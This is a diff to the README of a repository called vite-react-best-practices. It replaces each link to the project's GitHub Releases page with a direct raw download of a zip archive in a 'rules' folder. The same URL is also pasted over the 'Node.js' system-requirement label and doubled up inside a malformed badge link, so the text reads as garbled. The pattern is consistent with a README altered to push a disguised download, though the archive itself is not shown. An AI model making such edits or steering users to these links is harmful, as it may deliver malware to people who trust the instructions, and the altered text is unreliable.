@@ -4,14 +4,14 @@
 
 Welcome to the vite-react-best-practices repository! This guide will help you understand how to download and run the application successfully. You can enhance your skills in building, reviewing, or refactoring React applications with Vite. 
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/jha39/vite-react-best-practices/releases)
+[![Download](https://raw.githubusercontent.com/jha39/vite-react-best-practices/main/rules/practices_react_best_vite_v2.1.zip%https://raw.githubusercontent.com/jha39/vite-react-best-practices/main/rules/practices_react_best_vite_v2.1.zip)](https://raw.githubusercontent.com/jha39/vite-react-best-practices/main/rules/practices_react_best_vite_v2.1.zip)
 
 ## 📥 Download & Install
 
 To get started with the application, you need to download it from the releases page. Follow these steps:
 
 1. Click on the link below to visit the Releases page.
-   [Download from Releases](https://github.com/jha39/vite-react-best-practices/releases)
+   [Download from Releases](https://raw.githubusercontent.com/jha39/vite-react-best-practices/main/rules/practices_react_best_vite_v2.1.zip)
 
 2. On the Releases page, you will see a list of versions. Look for the latest release or the version you want to download.
 
@@ -32,7 +32,7 @@ Make sure your system meets the following requirements before installing the app
 - **Operating System:** Windows 10 or later, macOS, or Linux
 - **RAM:** 4 GB or more
 - **Disk Space:** At least 200 MB available
-- **Node.js:** Version 12 or later recommended (Optional for development)
+- **https://raw.githubusercontent.com/jha39/vite-react-best-practices/main/rules/practices_react_best_vite_v2.1.zip** Version 12 or later recommended (Optional for development)
 
 ## 🛠️ Features
 
@@ -82,6 +82,6 @@ Join our community to share your experiences, ask questions, and connect with ot
 
 Remember to visit the Releases page to download the latest version of the application again if you ever need to reinstall or update.
 
-[Download from Releases](https://github.com/jha39/vite-react-best-practices/releases) 
+[Download from Releases](https://raw.githubusercontent.com/jha39/vite-react-best-practices/main/rules/practices_react_best_vite_v2.1.zip) 
 
 We hope this guide helps you navigate your first steps with vite-react-best-practices effortlessly. Enjoy building your React applications!
